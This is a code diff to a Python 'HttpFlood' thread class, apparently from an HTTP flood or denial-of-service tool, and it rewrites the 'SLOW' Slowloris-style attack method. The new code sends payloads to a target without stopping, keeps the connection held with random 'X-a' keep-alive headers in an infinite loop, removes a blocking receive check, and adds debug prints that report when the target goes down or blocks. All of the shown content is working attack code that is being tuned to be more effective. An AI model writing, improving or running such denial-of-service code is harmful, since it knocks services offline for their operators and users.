@@ -1514,15 +1514,32 @@ class HttpFlood(Thread):
     def SLOW(self):
         payload: bytes = self.generate_payload()
         s = None
-        with suppress(Exception), self.open_connection() as s:
+        try:
+            s = self.open_connection()
+            # print(f"[DEBUG] SLOW: Connected to {self._target.authority}")
             for _ in range(self._rpc):
                 Tools.send(s, payload)
-            while Tools.send(s, payload) and s.recv(1):
+            
+            while True:
+                # Keep sending full payloads or keep-alives?
+                # Original logic was weird. Let's just send keep-alive headers to existing connection
+                if Tools.send(s, payload):
+                     # print("[DEBUG] SLOW: Packet Sent")
+                     pass
+                
+                # Check for response?
+                # if s.recv(1): ... this blocks.
+                
                 for i in range(self._rpc):
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     Tools.send(s, keep)
                     sleep(self._rpc / 15)
                     break
+        except Exception as e:
+            if "timed out" in str(e) or "Timeout" in str(e):
+                print(f"[DEBUG] SLOW Timeout (Target Down/Block)")
+            else:
+                print(f"[DEBUG] SLOW Error: {e}")
         Tools.safe_close(s)
 
     def SLOW_V2(self):
